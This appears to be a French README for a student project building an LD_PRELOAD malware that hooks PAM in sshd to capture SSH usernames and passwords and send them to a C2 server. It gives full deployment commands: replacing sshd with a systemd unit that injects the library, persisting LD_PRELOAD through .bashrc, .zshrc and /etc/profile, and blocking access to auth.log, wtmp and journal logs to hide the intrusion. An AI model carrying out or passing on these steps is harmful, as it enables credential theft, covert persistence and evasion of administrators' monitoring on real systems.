Projet de Malware utilisant LD_PRELOAD

Description :

Ce projet consiste en la création d'un malware en C qui intercepte les fonctions d'authentification SSH pour capturer les identifiants des utilisateurs. Il utilise la technique de LD_PRELOAD pour surcharger les fonctions de la bibliothèque PAM (Pluggable Authentication Modules) et ainsi intercepter les appels aux fonctions d'authentification. Les identifiants capturés sont ensuite envoyés à un serveur de Commande et Contrôle (C2) pour un suivi centralisé.

Fonctionnalités :

 - Interception des fonctions pam_get_user et pam_get_item pour capturer les noms d'utilisateur et les mots de passe.
 - Envoi des identifiants capturés à un serveur C2 via une connexion TCP.
 - Blocage de l'accès à certains fichiers sensibles en surchargeant les fonctions open, openat et fopen.

Fichiers du projet
 - pam_auth_logger.c : Contient le code du malware pour intercepter les fonctions PAM et envoyer les identifiants au serveur C2.
 - block_files.c : Contient le code pour bloquer l'accès à certains fichiers en surchargeant les fonctions de la bibliothèque standard C.
 - Makefile : Script de compilation pour générer la bibliothèque partagée libpam_auth_logger.so.
 - srv_tcp.c : Code du serveur C2 qui reçoit et enregistre les identifiants envoyés par le malware.

Avant de procéder a quoi que ce soit sur les machines, effectuez la commande suivante (qui permettra d'installer les outils de compilations,  la bibliotèque libpam + net-tools):

sudo apt install -y build-essential libpam0g-dev openssh-server

Compilation :

Dans un premier temps faites un git clone du projet :

Ouvrez un shell et copier le projet puis faite un :

 -  git clone https://github.com/snipzr/Partiel_C.git

Sur le C2,pour compiler le serveur TCP, utilisez la commande suivante :

- gcc -o srv_tcp srv_tcp.c

Utilisation Démarrage du serveur C2 :

Sur le C2, lancez le serveur TCP :

- ./srv_tcp

Victime :

- sudo su

cd /home/kali/Partiel_C
make clean && make

Vérifier si SSHD Tourne Déjà

systemctl is-active sshd

Si `active`, on doit le désactiver.

Désactiver et Arrêter SSHD

systemctl stop sshd
systemctl disable sshd
systemctl mask sshd

systemctl is-enabled sshd

Cela doit renvoyer disabled, masked ou not-found.

On va créer un service qui charge automatiquement `LD_PRELOAD` au démarrage.

vim /etc/systemd/system/ld_preload_sshd.service

y coller :

[Unit]
Description=SSH Daemon with LD_PRELOAD
After=network.target

[Service]
Environment="LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so"
ExecStart=/usr/sbin/sshd -D
Restart=on-failure
RestartSec=5s
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target

verifier si le LD_PRELOAD est bien pris en compte :

cat /tmp/debug.log

doit retourner : LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so

Appliquer et Activer le Service

systemctl daemon-reload
systemctl enable ld_preload_sshd
systemctl start ld_preload_sshd

ainsi le  LD_PRELOAD est bien injecté à chaque démarrage et envera a chaque connexion entrente ssh, les crédentials au C2.

Passons à la partie qui bloque l'accès au fichiers suivants (sans droit root):

1.Fichiers de logs systèmes

/var/log/wtmp /var/log/lastlog /var/log/btmp /var/log/auth.log /var/log/sysstat

2.Journaux de systemd

/var/log/journal

3.Logs liés à l'affichage graphique

Toute occurrence contenant "Xorg." (exemple : /var/log/Xorg.0.log)

On vas utiliser le libpam_auth_logger.so deja existant, pour verifier, dans Partiel_c :

ls -l libpam_auth_logger.so

Si rien ne sort, recompilez : 

make clean && make

Ensuite testez manuellement via :

LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so cat /var/log/auth.log

La commande doit renvoyer une erreur Permission denied.

La suite dependra du shell utillisé , pour savoir le quel on utilise :

echo $0

si bash est utilisé :

echo 'export LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so' >> ~/.bashrc
source ~/.bashrc

si zsh est utilisé :

echo 'export LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so' >> ~/.zshrc
source ~/.zshrc

il suffit de modifier  ~/.shell_utilisé

Vérifie que la variable est bien prise en compte :

echo $LD_PRELOAD

Ce qui affichera : /home/user/Partiel_C/libpam_auth_logger.so

Pour vérifier que le LD=PRELOAD soit toujours chargé, fermez le terminal puis ouvrez en un autre puis :

echo $LD_PRELOAD

Si la variable est toujours definie le LD=PRELOAD se chargera a chaque fois

Essayez maintenant d'ouvrir un des fichier ciblé, ca ne devrai pas fonctionner

ex : cat /var/log/auth.log

FACULTATIF CAR NECESSITE ROOT : Automatisation au démarrage pour TOUS les utilisateurs

Si l'on veux que tout les utilisateurs aient ce LD_PRELOAD sans qu'ils modifient .bashrc/.zshrc, On ajoute cette ligne dans /etc/profile :

echo 'export LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so' | sudo tee -a /etc/profile-
EXPLICATION :


Fonctionnement de LD_PRELOAD

LD_PRELOAD est une variable d'environnement utilisée sur les systèmes Unix pour spécifier des bibliothèques partagées à charger avant les autres lors de l'exécution d'un programme. Cela permet de surcharger des fonctions spécifiques, offrant ainsi la possibilité de modifier le comportement d'applications sans changer leur code source.

Dans ce projet, LD_PRELOAD nous permet d'intercepter les appels aux fonctions PAM sans modifier le code source du démon SSH. En utilisant cette technique, nous chargeons la bibliothèque libpam_auth_logger.so avant les autres bibliothèques système. Cela redéfinit des fonctions comme pam_get_user et pam_get_item pour capturer les identifiants utilisateur, qui sont ensuite transmis au serveur C2. L'approche par LD_PRELOAD est discrète et évite de nécessiter des droits root, ce qui est en phase avec les objectifs du projet.


Fonctionnement d'un Linker

Un linker, ou éditeur de liens, est un outil qui combine divers modules de code objet en un seul exécutable ou une bibliothèque. Il résout les références entre les symboles (fonctions, variables) définis dans différents modules, permettant ainsi à un programme de fonctionner correctement.

Dans le contexte de LD_PRELOAD, le linker dynamique (ld.so sur les systèmes Linux) joue un rôle clé en redirigeant les appels système vers nos fonctions redéfinies. Lorsque notre bibliothèque est chargée, le linker garantit que les appels aux fonctions PAM (par exemple, pam_get_user) passent par nos définitions personnalisées. Cette redirection est ce qui permet d'intercepter les credentials sans modifier directement les fichiers binaires du démon SSH.


Fonctionnement des Threads sur Linux

Un thread est une unité d'exécution au sein d'un processus. Les threads partagent le même espace mémoire et les mêmes ressources, mais peuvent être exécutés indépendamment, permettant une exécution parallèle au sein d'une application.

Dans ce projet, les threads pourraient être utilisés pour gérer plusieurs connexions simultanément entre les machines infectées et le serveur C2. Par exemple, chaque fois que des credentials sont capturés et transmis, un thread distinct pourrait gérer l'envoi au serveur C2, tout en permettant au malware de continuer à fonctionner en arrière-plan. Cela garantit une exécution fluide et rapide des tâches sans bloquer le système.
